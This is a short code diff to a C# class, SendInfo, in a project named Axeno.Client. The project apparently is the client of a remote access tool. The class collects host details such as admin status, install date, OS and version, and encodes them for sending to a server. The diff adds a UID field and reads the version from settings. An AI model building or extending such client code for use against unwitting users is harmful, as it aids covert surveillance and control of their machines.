@@ -1,5 +1,4 @@
 ﻿using Axeno.Client.Properties;
-using MessagePackLib.MessagePack;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
@@ -8,11 +7,13 @@ using System.Linq;
 using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
+using Axeno.Client.MessagePack;
 
 namespace Axeno.Client.Helper
 {
     internal class SendInfo
     {
+        public static string UID = "N/A";
         public static byte[] GetAndSendInformation()
         {
             MsgPack msgpack = new MsgPack();
@@ -22,7 +23,8 @@ namespace Axeno.Client.Helper
             msgpack.ForcePathObject("Applevel").AsString = IsAdministrator();
             msgpack.ForcePathObject("Instdate").AsString = InstallDate();
             msgpack.ForcePathObject("Operatingsystem").AsString = OperatingSystemInfo();
-            msgpack.ForcePathObject("Version").AsString = "v0.9.1";
+            msgpack.ForcePathObject("Version").AsString = Settings.Version;
+            msgpack.ForcePathObject("UID").AsString = UID;
 
             return msgpack.Encode2Bytes();
         }
